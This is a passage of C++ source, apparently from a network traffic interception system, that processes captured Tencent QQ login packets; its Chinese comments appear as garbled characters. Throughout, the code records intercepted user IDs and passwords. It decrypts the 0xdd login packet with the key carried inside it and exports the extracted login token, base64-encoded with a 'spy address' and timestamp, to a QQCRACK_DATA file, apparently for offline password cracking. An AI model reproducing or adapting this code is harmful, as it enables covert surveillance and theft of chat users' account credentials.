		break;
	case TM_CMD_LOGIN:
		if(QQVer > TM2008)
			CmdStr = pQQCmd[QQ_LOGIN];
		else
		{
			// �Ͱ汾��0x30, �ǵõ�sessionkey��
			return;
		}
		break;
	case 0x22:						// ��֤����
		if(QQVer < TM2008)
			CmdStr = pQQCmd[QQ_LOGIN];
		else
		{
			// �߰汾��0x22, �ǵõ�sessionkey��
			return;
		}
		break;
	case (BYTE)QQ2013_CMD_LOGIN:			// ��½
	case (BYTE)QQ2014_CMD_LOGIN:
	case QQ_0825_PACK:
	case QQ_0836_PACK:
	case QQ_0828_PACK:
		CmdStr = pQQCmd[QQ_LOGIN];
		break;
// 	case 0x1d:						// �ı�״̬,������½������OK
// 		CmdStr = pQQCmd[QQ_LOGIN];
// 		break;
// 	case (BYTE)QQ_CMD_GET_BUDDY_LIST:		// ��ú����б�,������½������OK
// 		CmdStr = pQQCmd[QQ_LOGIN];
// 		break;
// 	case (BYTE)QQ_CMD_GET_LEVEL:			// ��õȼ���Ϣ,������½������OK
// 		CmdStr = pQQCmd[QQ_LOGIN];
// 		break;
		// 	case 0xdd:		// ��֤����,�޷�ȷ���ѵ�½�ɹ�,���Ըð�����
		// 		CmdStr = pQQCmd[QQ_LOGIN];
		// 		break;
	default:
		// �����������
		return ;
		break;
	}
	
	// ����ļ�
	if ((v_programtype != SYSTEM_SLEUTH) && (QQCmd == 0x27))
		m_OpenIndxFlg = FALSE;		// ��ú����б�д����
	else
		m_OpenIndxFlg = v_openflagoicq;
	m_OpenCaseFlg = v_opencaseoicq;
	m_OpenWarnFlg = v_openwarnoicq;
	
	DWORD outBit = 0;
	if(0 == strcmp(CmdStr, pQQCmd[QQ_LOGIN]) && 0 == (m_sontype&BIT_OUTUP))
	{
		m_sontype&=BIT_NOTOUTDOWN;
		outBit = BIT_OUTUP;
	}
	else if(0 == strcmp(CmdStr, pQQCmd[QQ_LOGOUT]) && 0 == (m_sontype&BIT_OUTDOWN))
	{
		m_sontype&=BIT_NOTOUTUP;
		outBit = BIT_OUTDOWN;
	}
	else if(0 == strcmp(CmdStr, pQQCmd[QQ_GETLIST]) && 0 == (m_sontype&BIT_OUTLIST)
		&& (v_programtype == SYSTEM_SLEUTH || BIT_ISCASE == (m_sontype&BIT_ISCASE)))
	{
		outBit = BIT_OUTLIST;
	}
	m_begfiletm = packtm;
	if (v_stat)
	{
		// д���ʷ��IDCServer
		if (v_statImsgQQ && outBit)
		{
			HistoryRecord hisRec;
			hisRec.SetRecord(IDX_FORWTYPE,	"1");
			hisRec.SetRecord(IDX_ID,		m_userid);
			hisRec.SetRecord(IDX_USER,		m_userid);
			if(FALSE == m_password.IsEmpty() && m_password.Compare("(������֤ʧ��)") != 0)
				hisRec.SetRecord(IDX_PASS,		m_password);
			
			hisRec.SetRecord(IDX_STATE, CmdStr);
			WriteHisData("imsg_oicq", "imsg_oicq", &hisRec, g_pImsgMissObj,IMSG_PROTOCOL);//, HISTORY_DATA);
		}
		
		CString strISP;
		if (v_statIdc && v_IdcIpLib.QueryIdcIP(Swap4Byte(*(DWORD*)(m_cdip)), strISP))
		{
			CString str;
			str.Format("%s\1%s\1oicq\1��ʱ��Ϣ\1%s\1��ѶQQ\1%s\1\1",
				m_dip.Left(15), strISP, m_dip.Right(5), TYPESTATE_DECIDED);
			v_IdcServerStat[IMSG_PROTOCOL].AddServer(str);
		}
	}
	if( CheckHaveCrack() && 0 == (m_sontype & BIT_QQCRACK))
	{
		BYTE*   pTmpData;
		int		ptmplen;
		unsigned char dekey[16];
		BOOL bOK = FALSE;
		bytebuffer pbuf;
		token ttToken;
		time_t captm=0;
		if(FindPacket(0xdd, &pTmpData, ptmplen, TRUE, -1))
		{
			// 0xdd C->S
			memcpy(dekey, pTmpData, 16);
			pTmpData+=16;
			ptmplen -=16;
			if (DecryptQQPacket(pTmpData, ptmplen,
				dekey, (BYTE*)g_pMsgBuffer))
			{
				memcpy(pbuf.data, g_pMsgBuffer, ptmplen);
				pbuf.len = ptmplen;
				pbuf.pos = 0x50;	// 0x40 see myqq prot_login.c
				pbuf.size = ptmplen;
				get_token(&pbuf, &ttToken);
				ptmplen = ttToken.len;
				if(ptmplen == 0x78 && FALSE == m_userid.IsEmpty())
				{
					//////////////////////////////////////////////////////////////////////////
					// ?? ??(ver) 00 00 data(0x78) ...
					//////////////////////////////////////////////////////////////////////////
					char inbuf[0x80];
					int oo = Swap2Byte(m_qqver);
					memcpy(inbuf, &oo, 2);
					memcpy(inbuf+2, "\x0\x0", 2);
					memcpy(inbuf+4, ttToken.data, 0x78);
					char outbase64[200];
					memset(outbase64, 0, 200);
					CMailCoder::base64_encode(inbuf, 0x78+4, outbase64);
					CString tmpbcp = outbase64;
					tmpbcp.Replace("\r\n", "");
					strcpy(outbase64, tmpbcp);
					tmpbcp.Format("%s\t%s\t%s\t%s", 
						m_spyaddr, CTime::GetCurrentTime().Format("%Y-%m-%d %H:%M:%S"), 
						m_userid,
						outbase64);
					
					m_sontype |= BIT_QQCRACK;
					WriteArrToData(IMSG_PROTOCOL, QQCRACK_DATA, tmpbcp, NULL, m_userid);
				}
			}
		}
	}
	
	if(outBit)
	{
		SearchCaseEmailIm(this, m_userid, m_userid.GetLength(), 0);
		m_indexfname = CreateFilename(m_sip, m_dip, "imsg_oicq.indexfile.txt");
		CString stetxt;
		stetxt.Format("user= %s\r\nentity= 0\r\nstat= %s\r\nqqver= 0x%04x\r\n", m_userid, CmdStr, m_qqver);
		WriteIndexFile("imsg_oicq", "imsg_oicq", stetxt, g_pImsgMissObj);
		m_sontype |= outBit;
		
#ifdef _DEBUG
		printf("imsg %s\n", stetxt);
#endif
	}
}

